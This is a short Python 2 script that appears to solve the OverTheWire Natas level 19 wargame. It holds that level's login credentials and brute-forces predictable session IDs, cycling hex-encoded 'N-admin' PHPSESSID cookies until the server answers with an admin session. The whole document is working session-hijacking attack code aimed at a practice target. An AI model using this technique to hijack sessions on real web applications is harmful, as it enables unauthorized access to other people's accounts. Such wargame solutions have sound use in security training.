import httplib2
import urllib

website = httplib2.Http()
website.add_credentials("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

for id in range(640):
	query = urllib.urlencode({'debug':'1', 'username':'admin'})
	resp, content = website.request("http://natas19.natas.labs.overthewire.org/index.php?" + query, method="POST", headers={'Cookie':'PHPSESSID=' + (str(id)+'-admin').encode('hex')})
	if "You are an admin" in str(content):
		print str(content)